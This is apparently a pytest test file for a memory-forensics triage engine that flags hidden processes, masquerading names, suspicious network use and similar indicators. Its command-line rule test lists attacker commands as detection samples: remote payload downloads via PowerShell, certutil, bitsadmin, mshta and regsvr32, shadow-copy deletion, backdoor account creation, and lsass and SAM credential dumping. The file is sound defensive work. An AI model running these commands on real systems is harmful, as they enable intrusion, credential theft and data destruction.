"""
Automatic triage rules. Each rule is checked both ways: it fires on the
compromised fixture host, and it stays quiet on a clean one — a triage engine
that cries wolf trains examiners to ignore it.
"""
import pytest

from core.insights import (
    INSIGHT_PLUGINS, SEVERITIES, Finding, _edit_distance_one, _exe_from_cmdline,
    _is_public, analyse, counts, missing_inputs,
)
from tests.vol_fixtures import (
    CMDLINE_COLUMNS, DLLLIST_COLUMNS, NETSCAN_COLUMNS, PSLIST_COLUMNS, SVCSCAN_COLUMNS,
    _proc, all_payloads, payload,
)


def _by_category(findings):
    out = {}
    for f in findings:
        out.setdefault(f.category, []).append(f)
    return out


def _pslist(*rows, plugin="windows.pslist.PsList"):
    return {"plugin": plugin, "columns": PSLIST_COLUMNS, "rows": [list(r) for r in rows]}


CLEAN = [
    _proc(4, 0, "System", "08:00:01"),
    _proc(300, 4, "smss.exe", "08:00:02"),
    _proc(420, 300, "wininit.exe", "08:00:05"),
    _proc(480, 420, "services.exe", "08:00:06"),
    _proc(500, 420, "lsass.exe", "08:00:06"),
    _proc(620, 480, "svchost.exe", "08:00:09"),
    _proc(640, 480, "svchost.exe", "08:00:09"),
    _proc(700, 650, "csrss.exe", "08:00:04"),      # parent smss child exited: normal
    _proc(1800, 1700, "explorer.exe", "09:10:00"),  # userinit exited: normal
    _proc(2000, 1800, "chrome.exe", "09:20:00"),
]


# ── The compromised host ──────────────────────────────────────────────────────

@pytest.fixture(scope="module")
def findings():
    return analyse(all_payloads())


def test_every_planted_indicator_is_found(findings):
    categories = _by_category(findings)
    expected = {
        "Hidden process": "3100",
        "Unexpected parent": "2700",
        "Duplicate system process": None,
        "Masquerading name": "2600",
        "System binary in the wrong place": "2700",
        "Suspicious location": "2600",
        "Suspicious command line": "2520",
        "Unusual network activity": "2520",
        "Suspicious port": "2600",
        "Code injection": "1800",
        "Suspicious service": None,
        "Credential material": None,
    }
    for category, pid in expected.items():
        assert category in categories, category
        if pid:
            assert any(f.pid == pid for f in categories[category]), category


def test_findings_are_most_severe_first(findings):
    ranks = [SEVERITIES.index(f.severity) for f in findings]
    assert ranks == sorted(ranks)


def test_findings_carry_their_source_plugin(findings):
    assert all(f.plugin for f in findings)


def test_findings_are_unique(findings):
    assert len(findings) == len(set(findings))


def test_counts(findings):
    tally = counts(findings)
    assert set(tally) == set(SEVERITIES)
    assert sum(tally.values()) == len(findings)
    assert counts([]) == {s: 0 for s in SEVERITIES}


# ── The clean host: no false positives ────────────────────────────────────────

def test_a_clean_process_tree_raises_nothing():
    clean = [_pslist(*CLEAN), _pslist(*CLEAN, plugin="windows.psscan.PsScan")]
    assert analyse(clean) == []


def test_exited_process_missing_from_pslist_is_not_hidden():
    scan = CLEAN + [_proc(3000, 1800, "setup.exe", "09:00:00", exited="09:01:00")]
    assert analyse([_pslist(*CLEAN), _pslist(*scan, plugin="windows.psscan.PsScan")]) == []


def test_hidden_process_needs_both_lists():
    """psscan alone cannot show that something is missing from pslist."""
    assert not _by_category(analyse([payload("windows.psscan.PsScan")])).get("Hidden process")


def test_system_paths_are_not_flagged():
    rows = [["0", "620", "svchost.exe", "0x1", "0x1", "svchost.exe", path, "-1", "N/A", ""]
            for path in (r"C:\Windows\System32\svchost.exe", r"C:\WINDOWS\system32\svchost.exe",
                         r"\SystemRoot\System32\svchost.exe", r"C:\Windows\SysWOW64\svchost.exe")]
    found = analyse([{"plugin": "windows.dlllist.DllList", "columns": DLLLIST_COLUMNS,
                      "rows": rows[:1]}])
    assert found == []
    for row in rows:
        found = analyse([{"plugin": "windows.dlllist.DllList", "columns": DLLLIST_COLUMNS,
                          "rows": [row]}])
        assert found == [], row[6]


def test_ordinary_command_lines_are_not_flagged():
    rows = [["0", "1", "p.exe", line] for line in (
        r"C:\Windows\system32\svchost.exe -k netsvcs -p",
        "powershell.exe -File C:\\scripts\\backup.ps1",
        "cmd.exe /c echo hello",
        r'"C:\Program Files\Mozilla Firefox\firefox.exe" -contentproc',
        "", "N/A",
    )]
    assert analyse([{"plugin": "windows.cmdline.CmdLine", "columns": CMDLINE_COLUMNS,
                     "rows": rows}]) == []


def test_listening_sockets_and_normal_owners_are_not_flagged():
    rows = [
        ["0", "0x1", "TCPv4", "0.0.0.0", "445", "0.0.0.0", "0", "LISTENING", "4", "System", "N/A"],
        ["0", "0x2", "TCPv4", "10.0.0.5", "50000", "93.184.216.34", "443", "ESTABLISHED",
         "2000", "chrome.exe", "N/A"],
        ["0", "0x3", "TCPv4", "0.0.0.0", "5985", "0.0.0.0", "0", "LISTENING", "2520",
         "powershell.exe", "N/A"],
    ]
    assert analyse([{"plugin": "windows.netscan.NetScan", "columns": NETSCAN_COLUMNS,
                     "rows": rows}]) == []


def test_lolbin_talking_to_a_private_address_is_medium_not_high():
    rows = [["0", "0x1", "TCPv4", "10.0.0.5", "50000", "10.0.0.9", "445", "ESTABLISHED",
             "9", "rundll32.exe", "N/A"]]
    [finding] = analyse([{"plugin": "windows.netscan.NetScan", "columns": NETSCAN_COLUMNS,
                          "rows": rows}])
    assert finding.severity == "medium"


def test_one_finding_per_process_for_many_connections():
    rows = [["0", f"0x{i}", "TCPv4", "10.0.0.5", str(50000 + i), "8.8.8.8", "443",
             "ESTABLISHED", "9", "mshta.exe", "N/A"] for i in range(50)]
    found = analyse([{"plugin": "windows.netscan.NetScan", "columns": NETSCAN_COLUMNS,
                      "rows": rows}])
    assert len(found) == 1


def test_normal_services_are_not_flagged():
    rows = [["0", "0x1", "1", "620", "AUTO", "RUNNING", "WIN32", "Dnscache", "DNS",
             r"C:\Windows\system32\svchost.exe -k NetworkService", "", ""],
            ["0", "0x2", "2", "N/A", "AUTO", "STOPPED", "KERNEL", "Tcpip", "TCP/IP",
             r"\Driver\Tcpip", "", ""]]
    assert analyse([{"plugin": "windows.svcscan.SvcScan", "columns": SVCSCAN_COLUMNS,
                     "rows": rows}]) == []


def test_two_svchosts_are_not_duplicates():
    assert not _by_category(analyse([_pslist(*CLEAN)])).get("Duplicate system process")


def test_an_exited_duplicate_is_not_reported():
    rows = CLEAN + [_proc(900, 420, "lsass.exe", "08:30:00", exited="08:31:00")]
    assert not _by_category(analyse([_pslist(*rows)])).get("Duplicate system process")


# ── Individual rules ──────────────────────────────────────────────────────────

@pytest.mark.parametrize("line, title", [
    ("powershell -EncodedCommand " + "A" * 40, "PowerShell with an encoded command"),
    ("powershell -e " + "QQBB" * 10, "PowerShell with an encoded command"),
    ("powershell IEX (New-Object Net.WebClient).DownloadString('http://x')",
     "PowerShell Invoke-Expression"),
    ("certutil.exe -urlcache -split -f http://x/a.exe a.exe", "certutil used to fetch or decode"),
    ("bitsadmin /transfer j http://x/a.exe C:\\a.exe", "bitsadmin download"),
    ("mshta http://evil/x.hta", "mshta running remote or inline script"),
    ("regsvr32 /s /n /u /i:http://x/file.sct scrobj.dll", "regsvr32 remote scriptlet (Squiblydoo)"),
    ("vssadmin.exe delete shadows /all /quiet", "Shadow copies deleted"),
    ("net user backdoor P@ss /add", "Account or group membership added"),
    ("rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump 500 out.dmp full",
     "Credential dumping tooling"),
    ("reg save hklm\\sam C:\\sam.hiv", "Registry persistence or hive export"),
])
def test_command_line_rules(line, title):
    found = analyse([{"plugin": "windows.cmdline.CmdLine", "columns": CMDLINE_COLUMNS,
                      "rows": [["0", "7", "x.exe", line]]}])
    assert [f.title for f in found] == [title]


@pytest.mark.parametrize("name, flagged", [
    ("scvhost.exe", True), ("svch0st.exe", True), ("svchosts.exe", True),
    ("lsas.exe", True), ("csrsss.exe", True), ("explore.exe", True),
    ("svchost.exe", False), ("notepad.exe", False), ("SVCHOST.EXE", False),
    ("", False),
])
def test_masquerading(name, flagged):
    found = analyse([_pslist(_proc(77, 1, name, "09:00:00"))])
    assert bool(_by_category(found).get("Masquerading name")) is flagged


@pytest.mark.parametrize("a, b, expected", [
    ("svchost", "scvhost", True), ("svchost", "svchst", True), ("svchost", "svchosts", True),
    ("svchost", "svchost", False), ("svchost", "xxchost", False), ("a", "abc", False),
    ("", "a", True), ("", "", False),
])
def test_edit_distance_one(a, b, expected):
    assert _edit_distance_one(a, b) is expected


@pytest.mark.parametrize("address, public", [
    ("8.8.8.8", True), ("185.220.101.4", True), ("10.0.0.1", False),
    ("192.168.1.1", False), ("127.0.0.1", False), ("::1", False), ("fe80::1%12", False),
    ("0.0.0.0", False), ("*", False), ("", False), ("not-an-ip", False),
    ("2606:4700::1111", True),
])
def test_is_public(address, public):
    assert _is_public(address) is public


@pytest.mark.parametrize("cmdline, exe", [
    (r'"C:\Program Files\App\app.exe" --flag', r"C:\Program Files\App\app.exe"),
    (r"C:\Windows\system32\svchost.exe -k netsvcs", r"C:\Windows\system32\svchost.exe"),
    ('"unterminated', "unterminated"),
    ("plain", "plain"),
])
def test_exe_from_cmdline(cmdline, exe):
    assert _exe_from_cmdline(cmdline) == exe


def test_path_from_cmdline_when_dlllist_is_absent():
    found = analyse([{"plugin": "windows.cmdline.CmdLine", "columns": CMDLINE_COLUMNS,
                      "rows": [["0", "9", "lsass.exe", r"C:\Users\Public\lsass.exe"]]}])
    assert _by_category(found).get("System binary in the wrong place")


def test_injection_severity_depends_on_evidence():
    from tests.vol_fixtures import MALFIND_COLUMNS
    plain = ["0", "5", "x.exe", "0x1", "0x2", "VadS", "PAGE_EXECUTE_WRITECOPY", "1", "1",
             "", "", "00 00 00 00", ""]
    [finding] = analyse([{"plugin": "windows.malware.malfind.Malfind",
                          "columns": MALFIND_COLUMNS, "rows": [plain]}])
    assert finding.severity == "medium"


def test_credentials_are_reported_as_info():
    found = analyse([payload("windows.hashdump.Hashdump")])
    assert [f.severity for f in found] == ["info"]


# ── Robustness ────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("payloads", [
    None, [], [None, "x", 3],
    [{"plugin": "windows.pslist.PsList", "columns": None, "rows": None}],
    [{"plugin": "windows.pslist.PsList", "columns": ["PID"], "rows": [[None], [], "x"]}],
    [{"plugin": "windows.netscan.NetScan", "columns": NETSCAN_COLUMNS,
      "rows": [["0", "0x1", "TCP", "a", "notaport", "b", "alsonot", "", "", "", ""]]}],
    [{"plugin": "", "columns": [], "rows": []}],
])
def test_malformed_input_never_raises(payloads):
    assert isinstance(analyse(payloads), list)


def test_a_failing_rule_does_not_stop_the_others(monkeypatch):
    import core.insights as insights
    def explode(procs, tables):
        raise RuntimeError("boom")
    monkeypatch.setattr(insights, "_RULES", (explode,) + insights._RULES)
    assert analyse(all_payloads())


def test_the_newest_run_of_a_plugin_wins():
    old = _pslist(_proc(77, 1, "scvhost.exe", "09:00:00"))
    new = _pslist(_proc(77, 1, "notepad.exe", "09:00:00"))
    assert not _by_category(analyse([new, old])).get("Masquerading name")


def test_finding_rows_match_columns():
    from core.insights import FINDING_COLUMNS
    f = Finding("high", "c", "t", "d", "1", "p", "windows.x.Y")
    assert len(f.as_row()) == len(FINDING_COLUMNS)
    assert f.as_row()[0] == "HIGH" and f.as_row()[-1] == "Y"


def test_missing_inputs():
    assert missing_inputs(set()) == list(INSIGHT_PLUGINS)
    assert missing_inputs({p for p in INSIGHT_PLUGINS}) == []
